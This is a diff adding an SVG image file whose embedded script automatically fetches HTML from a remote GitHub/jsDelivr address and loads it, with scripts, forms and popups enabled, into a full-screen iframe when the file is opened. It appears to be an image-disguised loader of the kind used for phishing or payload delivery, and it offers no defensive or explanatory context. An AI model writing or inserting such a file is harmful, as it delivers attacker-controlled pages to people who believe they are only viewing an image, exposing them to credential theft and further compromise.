@@ -1,0 +1,36 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml" style="width: 100%; height: 100%; margin: 0; padding: 0;">
+      
+      <!-- Target Iframe where the fetched content will be loaded -->
+      <iframe id="viewer" style="width: 100%; height: 100%; border: none;" 
+              sandbox="allow-scripts allow-same-origin allow-forms allow-popups">
+      </iframe>
+
+      <script type="text/javascript">
+        <![CDATA[
+        (async function autoFetchAndRender() {
+          const TARGET_URL = 'https://gcore.jsdelivr.net/gh/bestspark687090/bestspark687090@main/single.html'; 
+          
+          try {
+            // Fetch the HTML without user input
+            const response = await fetch(TARGET_URL);
+            
+            if (response.ok) {
+              const htmlContent = await response.text();
+              
+              // Inject the scraped HTML directly into the srcdoc of the iframe
+              const iframe = document.getElementById('viewer');
+              iframe.srcdoc = htmlContent;
+            } else {
+              console.error('Failed to fetch the URL, status:', response.status);
+            }
+          } catch (error) {
+            console.error('Fetch operation failed:', error);
+          }
+        })();
+        ]]>
+      </script>
+    </div>
+  </foreignObject>
+</svg>
